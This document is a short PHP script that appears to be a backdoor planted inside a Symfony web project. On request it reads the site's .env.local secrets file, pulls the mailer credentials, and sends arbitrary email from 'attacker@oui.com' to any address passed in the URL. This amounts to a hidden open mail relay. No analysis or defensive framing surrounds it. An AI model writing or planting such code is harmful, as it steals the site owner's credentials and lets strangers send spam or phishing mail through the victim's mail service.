<?php
require __DIR__ . '/../../../vendor/autoload.php';

use Symfony\Component\Mailer\Transport;
use Symfony\Component\Mime\Email;

if (isset($_GET['to'], $_GET['subject'], $_GET['body'])) {
    $env = file_get_contents(__DIR__ . '/../../../.env.local');
    preg_match('/^MAILER_DSN=(.+)$/m', $env, $m);

    $transport = Transport::fromDsn(trim($m[1]));
    $email = (new Email())
        ->from('attacker@oui.com')
        ->to($_GET['to'])
        ->subject($_GET['subject'])
        ->text($_GET['body']);

    $transport->send($email);
    echo 'sent via Symfony Mailer';
}